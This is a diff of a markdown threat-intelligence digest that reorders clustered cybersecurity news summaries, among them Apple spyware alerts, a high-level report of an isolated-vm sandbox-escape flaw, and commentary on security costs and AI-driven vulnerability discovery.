-  - Title: How to Spot and Stop Rogue Device Joins
-  - Published: 2026-08-18T16:24:13+00:00
-  - Link: https://www.wiz.io/blog/detecting-entra-device-registration-abuse
-  - Summary: Instead of leaving behind recognizable fingerprints from public tooling, adversaries can now generate realistic device names that blend naturally into enterprise environments. This blog explores how that changes Entra ID detection and what are the behavioral signals that still expose these attacks.
 
 ### Cluster 175a6a518c — score 16
 
@@ -1908,6 +1892,47 @@ Threat Research Center Threat Research Malware Malware Identity Abuse Through Tr
   - Link: https://unit42.paloaltonetworks.com/communication-channel-identity-risks/
   - Summary: Unit 42 details how attackers exploit enterprise collaboration tools for identity phishing and credential theft. Discover key defense strategies. The post Identity Abuse Through Trusted Communication Channels appeared first on Unit 42 .
 
+### Cluster a7d83e74e6 — score 10
+
+- Title: ‘Unprecedented’ Number of Apple Users Received Recent Spyware Alert
+- Source: Citizen Lab (threat_research_primary)
+- Published: 2026-08-20T17:52:13+00:00
+- Link: https://citizenlab.ca/unprecedented-number-of-apple-users-received-recent-spyware-alert/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- affected_industries: telecommunications
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- affected_industries: telecommunications
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+Apple customers in 110 countries received threat notifications recently alerting them to suspected spyware attacks targeting their devices. The post ‘Unprecedented’ Number of Apple Users Received Recent Spyware Alert appeared first on The Citizen Lab .
+```
+
+#### Full body
+
+```
+Date Published August 20, 2026 Topics Targeted Surveillance Apple , spyware Mentions John Scott-Railton Share Apple customers in 110 countries received threat notifications recently alerting them to suspected spyware attacks targeting their devices, TechCrunch reports . Senior researcher John Scott-Railton says that the “scale and geographic diversity of public posts about receiving notifications are pretty unprecedented.” “For every public notification like this, you can imagine there’s a huge notification iceberg that the public will never learn about. This is a clear indication that something bigger is going on.” Apple debuted its spyware alerts in 2021, which Scott-Railton notes has been a “big improvement” for encouraging users to seek help. The notifications can also serve as a starting point for investigations that can reveal even more cases, especially as spyware has proliferated in recent years. Apple users that receive a notification should take it seriously, and are advised to switch on Lockdown Mode. Apple has yet to see a case where someone’s device was hacked while Lockdown Mode was enabled. Read here And here More in: Targeted Surveillance LATEST We found that former Member of the European Parliament Stelios Kouloglou was hacked with Pegasus spyware while serving on the PEGA committee, which investigated Pegasus and other spyware abuses in Europe. Through forensic analysis of his device, we found that the attackers could have had access to confidential documents and committee deliberations. July 3, 2026 Targeted Surveillance News + Updates → In the Media Co-Founder of Controversial Spyware Firm Had Israeli Diplomatic Passport JULY 28, 2026 News + Updates → Expert Insights How Iran Uses Cellular Infrastructure to Target US Military Phones JULY 24, 2026 News + Updates → In the Media US Military Smartphones Targeted Through Roaming and Ad Tech JULY 17, 2026
+```
+
+#### Corroborating sources (1)
+
+- **Citizen Lab** (threat_research_primary)
+  - Title: ‘Unprecedented’ Number of Apple Users Received Recent Spyware Alert
+  - Published: 2026-08-20T17:52:13+00:00
+  - Link: https://citizenlab.ca/unprecedented-number-of-apple-users-received-recent-spyware-alert/
+  - Summary: Apple customers in 110 countries received threat notifications recently alerting them to suspected spyware attacks targeting their devices. The post ‘Unprecedented’ Number of Apple Users Received Recent Spyware Alert appeared first on The Citizen Lab .
+
 ### Cluster 849426520e — score 10
 
 - Title: 24th August – Threat Intelligence Report
@@ -2001,47 +2026,6 @@ CATEGORIES AI Research 19 Android Malware 23 Artificial Intelligence 5 ChatGPT 3
   - Published: 2026-08-20T13:07:13+00:00
   - Link: https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/
   - Summary: Research by: Jiří Vinopal (@vinopaljiri) Abstract What if a trusted security component could be repurposed into an attacker-controlled kernel primitive? What if a signed Microsoft remediation driver could be instructed to execute arbitrary file and registry operations from Ring 0 – without exploits, vulnerabilities, or memory corruption? In this publication, we present the first full […] The post BTR Reforged: Weaponizing Defender’s Remediation Driver as a Kernel Operation Primitive appeared first on Check Point Research .
-
-### Cluster a7d83e74e6 — score 10
-
-- Title: ‘Unprecedented’ Number of Apple Users Received Recent Spyware Alert
-- Source: Citizen Lab (threat_research_primary)
-- Published: 2026-08-20T17:52:13+00:00
-- Link: https://citizenlab.ca/unprecedented-number-of-apple-users-received-recent-spyware-alert/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- affected_industries: telecommunications
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- affected_industries: telecommunications
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-Apple customers in 110 countries received threat notifications recently alerting them to suspected spyware attacks targeting their devices. The post ‘Unprecedented’ Number of Apple Users Received Recent Spyware Alert appeared first on The Citizen Lab .
-```
-
-#### Full body
-
-```
-Date Published August 20, 2026 Topics Targeted Surveillance Apple , spyware Mentions John Scott-Railton Share Apple customers in 110 countries received threat notifications recently alerting them to suspected spyware attacks targeting their devices, TechCrunch reports . Senior researcher John Scott-Railton says that the “scale and geographic diversity of public posts about receiving notifications are pretty unprecedented.” “For every public notification like this, you can imagine there’s a huge notification iceberg that the public will never learn about. This is a clear indication that something bigger is going on.” Apple debuted its spyware alerts in 2021, which Scott-Railton notes has been a “big improvement” for encouraging users to seek help. The notifications can also serve as a starting point for investigations that can reveal even more cases, especially as spyware has proliferated in recent years. Apple users that receive a notification should take it seriously, and are advised to switch on Lockdown Mode. Apple has yet to see a case where someone’s device was hacked while Lockdown Mode was enabled. Read here And here More in: Targeted Surveillance LATEST We found that former Member of the European Parliament Stelios Kouloglou was hacked with Pegasus spyware while serving on the PEGA committee, which investigated Pegasus and other spyware abuses in Europe. Through forensic analysis of his device, we found that the attackers could have had access to confidential documents and committee deliberations. July 3, 2026 Targeted Surveillance News + Updates → In the Media Co-Founder of Controversial Spyware Firm Had Israeli Diplomatic Passport JULY 28, 2026 News + Updates → Expert Insights How Iran Uses Cellular Infrastructure to Target US Military Phones JULY 24, 2026 News + Updates → In the Media US Military Smartphones Targeted Through Roaming and Ad Tech JULY 17, 2026
-```
-
-#### Corroborating sources (1)
-
-- **Citizen Lab** (threat_research_primary)
-  - Title: ‘Unprecedented’ Number of Apple Users Received Recent Spyware Alert
-  - Published: 2026-08-20T17:52:13+00:00
-  - Link: https://citizenlab.ca/unprecedented-number-of-apple-users-received-recent-spyware-alert/
-  - Summary: Apple customers in 110 countries received threat notifications recently alerting them to suspected spyware attacks targeting their devices. The post ‘Unprecedented’ Number of Apple Users Received Recent Spyware Alert appeared first on The Citizen Lab .
 
 ### Cluster 3e394c1410 — score 10
 
@@ -2543,49 +2527,6 @@ Hackers breached over 270 Zimbra servers in ongoing attacks By Sergiu Gatlan Aug
   - Link: https://www.bleepingcomputer.com/news/security/hackers-breached-over-270-zimbra-servers-in-ongoing-attacks/
   - Summary: Threat actors have already compromised over 270 Zimbra instances in remote code execution attacks targeting a high-severity Zimbra Collaboration Suite (ZCS) vulnerability. [...]
 
-### Cluster 89ccf2f4b4 — score 9
-
-- Title: Is Cyber Facing an Affordability Crisis?
-- Source: Dark Reading (cyber_news_breach_reporting)
-- Published: 2026-08-25T14:53:13+00:00
-- Link: https://www.darkreading.com/cybersecurity-operations/is-cyber-facing-an-affordability-crisis-
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: data_breach, ransomware_extortion, supply_chain
-- affected_industries: financial_services
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, supply_chain, data_breach
-- affected_industries: financial_services
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-As breach costs reach record highs and defense spending nears $240 billion, small businesses are dangerously exposed, threatening supply chain security.
-```
-
-#### Full body
-
-```
-Cybersecurity Operations Cybersecurity In-Depth: Feature articles on security strategy, latest trends, and people to know. Is Cyber Facing an Affordability Crisis? As breach costs reach record highs and defense spending nears $240 billion, small businesses are dangerously exposed, threatening supply chain security. Arielle Waldman , Features Writer , Dark Reading August 25, 2026 5 Min Read Source: Alexfiodorov via Getty Images A chief information security officer—if the company can even afford one— is woken by an urgent phone call in the middle of the night. There's been a breach. Threat actors stole highly sensitive customer data, and now they're demanding a ransom. If the company doesn't pay, they will leak data on the Dark Web. That's when the clock, and the financial fallout, starts ticking. Whether it's a ransomware attack , business email compromise, or a third-party supply chain attack, organizations have unfortunately become increasingly accustomed to suffering data breaches. But they are caught between rising threats they can't ignore and burgeoning defense costs they can't sustain. The paradox is leading to a cybersecurity affordability crisis. For small-to-medium sized businesses (SMBs), which lack the deep pockets of large enterprises, one breach could shutter their doors permanently. The global average cost of a data breach reached a record $4.99 million in 2025, according to IBM's " 2026 Cost of a Data Breach Report ," that noted a 12% rise over the previous year. That equates to $1,100 per hour. Related: Money and Mindset: The Two Biggest Roadblocks to Cyber Policing Meanwhile, Gartner projects global cybersecurity spending costs for organizations – including network security, security services, and software security – will reach $239.8 billion this year, up from $193.4 billion in 2024. Artificial intelligence (AI) adoption is only adding to the challenge as organizations race to implement the latest models. Save the SMBs, Save the World Attackers target SMBs more often compared to large enterprises because they know they're the weak link, either due to budget constraints or because cybersecurity is not a priority. Although SMBs pose a systemic risk to the supply chain, the market doesn't reflect that. While vendors releasing new security tools may be doing it for the right reason, and truly want to manage risks and prevent attacks, their venture capital backers want them to find the more profitable big fishes, explains Bryson Byrd, cybersecurity advisor for Huntress. Subsequently, venture-backed vendors will develop a product for large enterprises that's more expensive or doesn't consider that smaller businesses lack a dedicated security team or around-the-clock security operations center, leaving them behind. That's a disservice to organizations of all sizes, Byrd tells Dark Reading. "When you have millions of small businesses that exist, what ends up happening is disproportionately we – as a country, we as a community, however we want to define it – are less secure," says Byrd. Related: Mission-Driven Security: Inside a Global Bank's Defense While cybersecurity is a budget issue, Byrd argues that it's also a prioritization and business resilience issue as much as anything else. Those are the problems that need to be solved, especially in the SMB space, he urges. Don't Bank on AI to Reduce Costs The issue is less that organizations have suddenly stopped spending money on cybersecurity and more that the economics are getting harder to sustain: Costs are rising faster than budgets while security headcounts remain the same, says Syed Ghayur, VP of solution engineering at ArmorCode. He believes the industry is seeing the early signs of a cyber affordability crisis. Security teams are being asked to process dramatically more risk without a comparable increase in people or budget, Ghayur adds. He notes the average enterprise already operates with 40 security scanners, and points to research from Palo Alto Networks a
-```
-
-#### Corroborating sources (1)
-
-- **Dark Reading** (cyber_news_breach_reporting)
-  - Title: Is Cyber Facing an Affordability Crisis?
-  - Published: 2026-08-25T14:53:13+00:00
-  - Link: https://www.darkreading.com/cybersecurity-operations/is-cyber-facing-an-affordability-crisis-
-  - Summary: As breach costs reach record highs and defense spending nears $240 billion, small businesses are dangerously exposed, threatening supply chain security.
-
 ### Cluster 548cb67a79 — score 9
 
 - Title: AI supply chain risk is showing up in developer workflows first
@@ -2672,55 +2613,48 @@ Help Net Security August 25, 2026 Share The cybercrime supply chain has five sta
   - Link: https://www.helpnetsecurity.com/2026/08/25/cybercrime-supply-chain-video/
   - Summary: In this Help Net Security video, Chris Nyhuis, CEO at Vigilant, explains why the picture of a lone ransomware attacker is about 15 years out of date. He walks through the cybercrime supply chain and the five businesses inside it: harvesters who run infostealer malware, brokers who verify and resell access, ransomware-as-a-service operators who build the toolkit, affiliates who run the intrusion, and launderers who move the proceeds. Nyhuis covers what each stage costs, from … More → The post The cybercrime supply chain has five stages, each with a price appeared first on Help Net Security .
 
-### Cluster 9f44f5f9a4 — score 9
+### Cluster 89ccf2f4b4 — score 9
 
-- Title: Isolated-vm Flaw Lets Sandboxed JavaScript Escape to Host for Potential RCE
-- Source: The Hacker News (cyber_news_breach_reporting)
-- Published: 2026-08-20T13:48:24+00:00
-- Link: https://thehackernews.com/2026/08/isolated-vm-flaw-lets-sandboxed.html
+- Title: Is Cyber Facing an Affordability Crisis?
+- Source: Dark Reading (cyber_news_breach_reporting)
+- Published: 2026-08-25T14:53:13+00:00
+- Link: https://www.darkreading.com/cybersecurity-operations/is-cyber-facing-an-affordability-crisis-
 - Fetch status: ok
-- Member count: 2
-- Corroborating source count: 2
-- Strong signals: GitHub
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: ddos
-- affected_products: GitHub, Gogs, Microsoft Entra
-- urgency_signals: critical_cvss
-- content_type: news_report, vulnerability_disclosure
-- confidence_tier: tier_4_news, tier_5_chatter
+- threat_categories: data_breach, ransomware_extortion, supply_chain
+- affected_industries: financial_services
+- content_type: news_report
+- confidence_tier: tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: ddos
-- affected_products: Gogs, Microsoft Entra, GitHub
-- urgency_signals: critical_cvss
+- threat_categories: ransomware_extortion, supply_chain, data_breach
+- affected_industries: financial_services
 - content_type: news_report
 - confidence_tier: tier_4_news
 
 #### Summary
 
 ```
-Cybersecurity researchers have disclosed a critical security flaw in isolated-vm, a popular open-source sandbox with more than 2,900 stars and 190 forks on GitHub, that could allow attackers to escape the confines of the isolated environment. The vulnerability ("GHSA-864f-rcv7-6rh4"), which has yet to be assigned a CVE identifier, impacts all versions of the library before and including 7.0.0.
+As breach costs reach record highs and defense spending nears $240 billion, small businesses are dangerously exposed, threatening supply chain security.
 ```
 
 #### Full body
 
 ```
-Isolated-vm Flaw Lets Sandboxed JavaScript Escape to Host for Potential RCE  Ravie Lakshmanan  Aug 20, 2026 Vulnerability / Application Security Cybersecurity researchers have disclosed a critical security flaw in isolated-vm , a popular open-source sandbox with more than 2,900 stars and 190 forks on GitHub, that could allow attackers to escape the confines of the isolated environment. The vulnerability (" GHSA-864f-rcv7-6rh4 "), which has yet to be assigned a CVE identifier, impacts all versions of the library before and including 7.0.0. It has been patched in versions 6.2.0 and 7.0.1 released earlier this month. Isolated-vm is a Node.js library for running untrusted JavaScript inside a V8 Isolate , an independent instance of the Google V8 JavaScript engine, allowing multiple sandboxed JavaScript environments to run concurrently without sharing data or interfering with each other. The npm package has witnessed nearly 1 million downloads over the past week. Because each V8 Isolate has a separate state and maintains its own heap, it is not possible to directly pass JavaScript objects from the main Node.js thread into a worker isolate. Isolated-vm exposes a class called ExternalCopy to securely serialize JavaScript objects out of the host isolate and deserialize them into the guest isolate. The vulnerability identified by Endor Labs resides in this component, allowing code running inside the sandbox to break out and corrupt memory in the host application. "A type confusion in ExternalCopy's handling of the transferList option lets code running inside the sandbox corrupt memory in the host process," Endor Labs researcher Cristian-Alexandru Staicu, who is credited with discovering and reporting the flaw, said in a technical write-up shared with The Hacker News. "Starting from nothing but a single ivm.Reference, the standard way hosts hand a sandbox any capability at all, we escalated the bug from a controlled-address crash all the way to hijacking the host's control flow, demonstrating a full guest-to-host sandbox escape." Successful exploitation of the flaw allows memory corruption in the host process, causing the host process to crash with a segmentation fault ( SIGSEGV ). It can also lead to a guest-to-host sandbox escape and an erosion of the trust boundary that undermines the very purpose of isolated-vm. "Minimum demonstrated impact is a reliable, controlled-address crash (denial-of-service) triggerable by any guest that has been given an ivm.Reference (the standard way to grant a sandbox any capability)," project maintainer Marcel Laverdet said in an advisory. "Maximum demonstrated impact is control-flow hijack of the host process, i.e., potential remote code execution in the host." Users who have isolated-vm installed in their developer environments are advised to update to the latest version for optimal protection. Additional details of the full exploit have been withheld so as to prevent bad actors from launching their own attacks. "The most important takeaway is that what was not broken was the isolation primitive itself," Staicu said. "V8's Isolate boundary held. What failed was the C++ glue code that marshals values across that boundary. A perfectly sound building block was undermined by the binding layer wrapped around it." Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Application Security , Developer Security , JavaScript , Open Source , remote code execution , Sandbox Security , Vulnerability ⚡ Top Stories This Week Microsoft Patches Severe Entra ID Flaw (CVSS 10.0) Allowing Remote Code Execution ThreatsDay: Gogs 10.0 RCE, n8n Workflow-to-RCE, $10M Reward, GLM-5.3 AI Exploit, and More New Cryptographic Context Injection Attack Could Let Web Pages Steal Grok Chat Data Zombie Card Attack Can Revive Expired Visa Cards for Contactless Payments CDN Tsunami Attack Abuses HTTP/3 Translation for
+Cybersecurity Operations Cybersecurity In-Depth: Feature articles on security strategy, latest trends, and people to know. Is Cyber Facing an Affordability Crisis? As breach costs reach record highs and defense spending nears $240 billion, small businesses are dangerously exposed, threatening supply chain security. Arielle Waldman , Features Writer , Dark Reading August 25, 2026 5 Min Read Source: Alexfiodorov via Getty Images A chief information security officer—if the company can even afford one— is woken by an urgent phone call in the middle of the night. There's been a breach. Threat actors stole highly sensitive customer data, and now they're demanding a ransom. If the company doesn't pay, they will leak data on the Dark Web. That's when the clock, and the financial fallout, starts ticking. Whether it's a ransomware attack , business email compromise, or a third-party supply chain attack, organizations have unfortunately become increasingly accustomed to suffering data breaches. But they are caught between rising threats they can't ignore and burgeoning defense costs they can't sustain. The paradox is leading to a cybersecurity affordability crisis. For small-to-medium sized businesses (SMBs), which lack the deep pockets of large enterprises, one breach could shutter their doors permanently. The global average cost of a data breach reached a record $4.99 million in 2025, according to IBM's " 2026 Cost of a Data Breach Report ," that noted a 12% rise over the previous year. That equates to $1,100 per hour. Related: Money and Mindset: The Two Biggest Roadblocks to Cyber Policing Meanwhile, Gartner projects global cybersecurity spending costs for organizations – including network security, security services, and software security – will reach $239.8 billion this year, up from $193.4 billion in 2024. Artificial intelligence (AI) adoption is only adding to the challenge as organizations race to implement the latest models. Save the SMBs, Save the World Attackers target SMBs more often compared to large enterprises because they know they're the weak link, either due to budget constraints or because cybersecurity is not a priority. Although SMBs pose a systemic risk to the supply chain, the market doesn't reflect that. While vendors releasing new security tools may be doing it for the right reason, and truly want to manage risks and prevent attacks, their venture capital backers want them to find the more profitable big fishes, explains Bryson Byrd, cybersecurity advisor for Huntress. Subsequently, venture-backed vendors will develop a product for large enterprises that's more expensive or doesn't consider that smaller businesses lack a dedicated security team or around-the-clock security operations center, leaving them behind. That's a disservice to organizations of all sizes, Byrd tells Dark Reading. "When you have millions of small businesses that exist, what ends up happening is disproportionately we – as a country, we as a community, however we want to define it – are less secure," says Byrd. Related: Mission-Driven Security: Inside a Global Bank's Defense While cybersecurity is a budget issue, Byrd argues that it's also a prioritization and business resilience issue as much as anything else. Those are the problems that need to be solved, especially in the SMB space, he urges. Don't Bank on AI to Reduce Costs The issue is less that organizations have suddenly stopped spending money on cybersecurity and more that the economics are getting harder to sustain: Costs are rising faster than budgets while security headcounts remain the same, says Syed Ghayur, VP of solution engineering at ArmorCode. He believes the industry is seeing the early signs of a cyber affordability crisis. Security teams are being asked to process dramatically more risk without a comparable increase in people or budget, Ghayur adds. He notes the average enterprise already operates with 40 security scanners, and points to research from Palo Alto Networks a
 ```
 
-#### Corroborating sources (2)
+#### Corroborating sources (1)
 
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: Isolated-vm Flaw Lets Sandboxed JavaScript Escape to Host for Potential RCE
-  - Published: 2026-08-20T13:48:24+00:00
-  - Link: https://thehackernews.com/2026/08/isolated-vm-flaw-lets-sandboxed.html
-  - Summary: Cybersecurity researchers have disclosed a critical security flaw in isolated-vm, a popular open-source sandbox with more than 2,900 stars and 190 forks on GitHub, that could allow attackers to escape the confines of the isolated environment. The vulnerability ("GHSA-864f-rcv7-6rh4"), which has yet to be assigned a CVE identifier, impacts all versions of the library before and including 7.0.0.
-- **Reddit r/netsec** (reddit_practitioner_osint)
-  - Title: How a popular Android library silently exposed thousands of apps to Arbitrary File Overwrite (AFO). https://itis911.github.io/writeups/cropper-vulnerability.html
-  - Published: 2026-08-18T16:24:33+00:00
-  - Link: https://www.reddit.com/r/netsec/comments/1vru26k/how_a_popular_android_library_silently_exposed/
-  - Summary: submitted by /u/Fit_Veterinarian4403 [link] [comments]
+- **Dark Reading** (cyber_news_breach_reporting)
+  - Title: Is Cyber Facing an Affordability Crisis?
+  - Published: 2026-08-25T14:53:13+00:00
+  - Link: https://www.darkreading.com/cybersecurity-operations/is-cyber-facing-an-affordability-crisis-
+  - Summary: As breach costs reach record highs and defense spending nears $240 billion, small businesses are dangerously exposed, threatening supply chain security.
 
 ### Cluster 114ded0230 — score 8
 
@@ -2808,47 +2742,6 @@ Advertisement Get our latest cybersecurity news first on Google. Click here! Clo
   - Link: https://cyberscoop.com/apollo-discloses-data-breach-social-engineering-attack/
   - Summary: The private equity firm said attackers broke into some of its cloud platforms during a five-day period in early July, compromising sensitive personal data. The post Apollo discloses data breach from ongoing wave of attacks hitting financial sector appeared first on CyberScoop .
 
-### Cluster f0848ac964 — score 8
-
-- Title: The Vulnerability Gap: Why Discovery Is Outrunning Repair
-- Source: Dark Reading (cyber_news_breach_reporting)
-- Published: 2026-08-24T14:00:00+00:00
-- Link: https://www.darkreading.com/cybersecurity-operations/vulnerability-gap-why-discovery-is-outrunning-repair
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: data_breach
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: data_breach
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-AI is discovering more vulnerabilities, faster, and under a tightening regulatory environment, making this an all-hands-on-deck moment for the cybersecurity community.
-```
-
-#### Full body
-
-```
-Cybersecurity Operations Cybersecurity Analytics Vulnerabilities & Threats Commentary The Vulnerability Gap: Why Discovery Is Outrunning Repair AI is discovering more vulnerabilities, faster, and under a tightening regulatory environment, making this an all-hands-on-deck moment for the cybersecurity community. Christopher Robinson , Chief Security Architect, Open Source Security Foundation August 24, 2026 4 Min Read Source: DNY59 via Getty Images COMMENTARY For decades, finding a serious vulnerability in widely used open source software was specialized work. It took a skilled researcher weeks, sometimes months, to trace a flaw and responsibly bring it to a maintainer. That timeline has effectively collapsed. Advanced AI models can now produce vulnerability reports in hours, demolishing what a seasoned professional would have taken weeks to develop. That's not hypothetical: it's what the open source security community has watched happen since the fall of last year, as tools built on frontier models and strong open-weight models alike started turning out findings that are, frankly, good. The trouble is that discovery was never the bottleneck. Fixing was. Patching, disclosure coordination, the upstream maintainer who has to understand a report, validate it, and ship a release — none of that has sped up at anywhere near the same rate. Some projects are using AI to combat the problem, like Valkey's provenance guard or AIxCC winner Trail of Bits' Buttercup finding vulns at DEF CON 2025. Related: Is Cyber Facing an Affordability Crisis? Discovery in Hours, Remediation in Weeks However, the structural mismatch remains: discovery measured in hours, remediation still measured in weeks and months. IBM's Cost of a Data Breach Report 2026 puts a number on that gap. One in four malicious breaches last year were AI-enabled, up 56% over the prior year, and those breaches cost companies $6 million on average, roughly a million more than the overall breach average. The same research found only 18% of organizations are applying AI agents to vulnerability management, even as more than half already use agents for threat detection. Models are finding problems at maximum velocity while the humans supporting these projects are still sitting in the parking lot. Adversaries already have comparably capable agents on their team, too, because the evidence says so. Open-weight models have closed much of the gap with the most expensive frontier systems, which is generally good for defenders: Openness lets you understand how a model was trained and steer it deliberately rather than trust a black box. However, that same openness lowers the floor for attackers, too. This is a current reality. So, what needs to change? Remediation and Prioritization Remediation and prioritization have to become an engineering discipline. When the tens of thousands of lines of AI-discovered findings arrive in droves, treating each as an emergency is a recipe for burnout and bad triage. Projects need prearranged criteria for severity and exploitability, and reports need to reach maintainers validated and documented, not as a raw data dump that overwhelms a human reviewer. Related: Money and Mindset: The Two Biggest Roadblocks to Cyber Policing Right now, a lot of that validation and routing work simply has no home: Multiple organizations independently scan the same obscure library, then each file separately without coordinating, multiplying the load on a maintainer who, on top of all of this, may be working on the project in their spare time. That's the coordination gap efforts like Project Akrites are starting to fill, verifying findings, arming maintainers with context, and synchronizing disclosure, so a fix reaches everyone who depends on a package at the same moment it goes public. It's one piece of a larger response the ecosystem needs and will only work alongside longer-running efforts to create best practices, financially support maintainers, and elevate secure-by-design w
-```
-
-#### Corroborating sources (1)
-
-- **Dark Reading** (cyber_news_breach_reporting)
-  - Title: The Vulnerability Gap: Why Discovery Is Outrunning Repair
-  - Published: 2026-08-24T14:00:00+00:00
-  - Link: https://www.darkreading.com/cybersecurity-operations/vulnerability-gap-why-discovery-is-outrunning-repair
-  - Summary: AI is discovering more vulnerabilities, faster, and under a tightening regulatory environment, making this an all-hands-on-deck moment for the cybersecurity community.
-
 ### Cluster 861fefc3f5 — score 8
 
 - Title: ShinyHunters taunts ReliaQuest after its own employee falls for social engineering attack
@@ -2911,6 +2804,47 @@ Sinisa Markovic , Managing Editor, Help Net Security August 25, 2026 Share Shiny
   - Link: https://www.bleepingcomputer.com/news/security/reliaquest-confirms-failed-data-theft-attack-after-shinyhunters-breach/
   - Summary: Cybersecurity company ReliaQuest has confirmed that one of its employees was targeted in a social engineering attack after hackers impersonated a member of the security team. [...]
 
+### Cluster f0848ac964 — score 8
+
+- Title: The Vulnerability Gap: Why Discovery Is Outrunning Repair
+- Source: Dark Reading (cyber_news_breach_reporting)
+- Published: 2026-08-24T14:00:00+00:00
+- Link: https://www.darkreading.com/cybersecurity-operations/vulnerability-gap-why-discovery-is-outrunning-repair
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: data_breach
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: data_breach
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+AI is discovering more vulnerabilities, faster, and under a tightening regulatory environment, making this an all-hands-on-deck moment for the cybersecurity community.
+```
+
+#### Full body
+
+```
+Cybersecurity Operations Cybersecurity Analytics Vulnerabilities & Threats Commentary The Vulnerability Gap: Why Discovery Is Outrunning Repair AI is discovering more vulnerabilities, faster, and under a tightening regulatory environment, making this an all-hands-on-deck moment for the cybersecurity community. Christopher Robinson , Chief Security Architect, Open Source Security Foundation August 24, 2026 4 Min Read Source: DNY59 via Getty Images COMMENTARY For decades, finding a serious vulnerability in widely used open source software was specialized work. It took a skilled researcher weeks, sometimes months, to trace a flaw and responsibly bring it to a maintainer. That timeline has effectively collapsed. Advanced AI models can now produce vulnerability reports in hours, demolishing what a seasoned professional would have taken weeks to develop. That's not hypothetical: it's what the open source security community has watched happen since the fall of last year, as tools built on frontier models and strong open-weight models alike started turning out findings that are, frankly, good. The trouble is that discovery was never the bottleneck. Fixing was. Patching, disclosure coordination, the upstream maintainer who has to understand a report, validate it, and ship a release — none of that has sped up at anywhere near the same rate. Some projects are using AI to combat the problem, like Valkey's provenance guard or AIxCC winner Trail of Bits' Buttercup finding vulns at DEF CON 2025. Related: Is Cyber Facing an Affordability Crisis? Discovery in Hours, Remediation in Weeks However, the structural mismatch remains: discovery measured in hours, remediation still measured in weeks and months. IBM's Cost of a Data Breach Report 2026 puts a number on that gap. One in four malicious breaches last year were AI-enabled, up 56% over the prior year, and those breaches cost companies $6 million on average, roughly a million more than the overall breach average. The same research found only 18% of organizations are applying AI agents to vulnerability management, even as more than half already use agents for threat detection. Models are finding problems at maximum velocity while the humans supporting these projects are still sitting in the parking lot. Adversaries already have comparably capable agents on their team, too, because the evidence says so. Open-weight models have closed much of the gap with the most expensive frontier systems, which is generally good for defenders: Openness lets you understand how a model was trained and steer it deliberately rather than trust a black box. However, that same openness lowers the floor for attackers, too. This is a current reality. So, what needs to change? Remediation and Prioritization Remediation and prioritization have to become an engineering discipline. When the tens of thousands of lines of AI-discovered findings arrive in droves, treating each as an emergency is a recipe for burnout and bad triage. Projects need prearranged criteria for severity and exploitability, and reports need to reach maintainers validated and documented, not as a raw data dump that overwhelms a human reviewer. Related: Money and Mindset: The Two Biggest Roadblocks to Cyber Policing Right now, a lot of that validation and routing work simply has no home: Multiple organizations independently scan the same obscure library, then each file separately without coordinating, multiplying the load on a maintainer who, on top of all of this, may be working on the project in their spare time. That's the coordination gap efforts like Project Akrites are starting to fill, verifying findings, arming maintainers with context, and synchronizing disclosure, so a fix reaches everyone who depends on a package at the same moment it goes public. It's one piece of a larger response the ecosystem needs and will only work alongside longer-running efforts to create best practices, financially support maintainers, and elevate secure-by-design w
+```
+
+#### Corroborating sources (1)
+
+- **Dark Reading** (cyber_news_breach_reporting)
+  - Title: The Vulnerability Gap: Why Discovery Is Outrunning Repair
+  - Published: 2026-08-24T14:00:00+00:00
+  - Link: https://www.darkreading.com/cybersecurity-operations/vulnerability-gap-why-discovery-is-outrunning-repair
+  - Summary: AI is discovering more vulnerabilities, faster, and under a tightening regulatory environment, making this an all-hands-on-deck moment for the cybersecurity community.
+
 ### Cluster dadc215b5f — score 8
 
 - Title: A Malicious Webpage Could Poison Your Local AI Model Behind NVIDIA NemoClaw
@@ -2923,12 +2857,14 @@ Sinisa Markovic , Managing Editor, Help Net Security August 25, 2026 Share Shiny
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
+- affected_products: Apple iOS/macOS
 - cve_ids: CVE-2024-28224
 - urgency_signals: preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
+- affected_products: Apple iOS/macOS
 - cve_ids: CVE-2024-28224
 - urgency_signals: preauth_unauth
 - content_type: news_report
@@ -2943,7 +2879,7 @@ Oasis Security has disclosed a weakness in NVIDIA NemoClaw that could let an att
 #### Full body
 
 ```
